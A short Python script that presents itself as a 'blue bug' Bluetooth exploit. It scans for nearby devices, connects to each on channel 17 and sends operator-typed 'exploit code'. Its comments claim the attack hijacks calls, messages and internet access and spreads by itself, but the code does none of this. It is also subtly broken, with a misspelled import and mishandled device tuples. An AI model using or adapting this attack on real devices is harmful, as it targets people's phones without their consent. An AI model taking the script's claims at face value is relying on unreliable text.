# the blue bug exploit is a bluetooth exploit that allows to send code to a bluetooth enabled device
# the attacker can then use the device to make calls, send messages, and access the internet

# this specific exploit scans the nearby area and automatically inserts itself into any bluetooth enabled device

import lightblue
import bluetooh

def find_and_exploit():
    # scan for nearby devices
    devices = bluetooh.discover_devices(duration=8, lookup_names=True, flush_cache=True, lookup_class=True)
    
    if not devices:
        print("No devices found. Exiting...")
        return

    # print nearby devices
    print(f"Found {len(devices)} devices\n")
    print("Nearby devices:")
    for addr, name, device_class in devices:
        print(f"  {addr} - {name} - {device_class}")
    
    # exploit devices
    for addr in devices:
        running = True
        channel = 17
        sock = lightblue.socket()
        sock.connect((addr, channel))
        
        # send exploit code
        while running:
            exploit = input("Enter code to send: ")
            if exploit == "":
                running = False
            else:
                sock.send(exploit)
                response = sock.recv(1024)
                print(response)
        
        sock.close()
    
if __name__ == "__main__":
    print("Finding Bluetooth devices to probe...")
    find_and_exploit()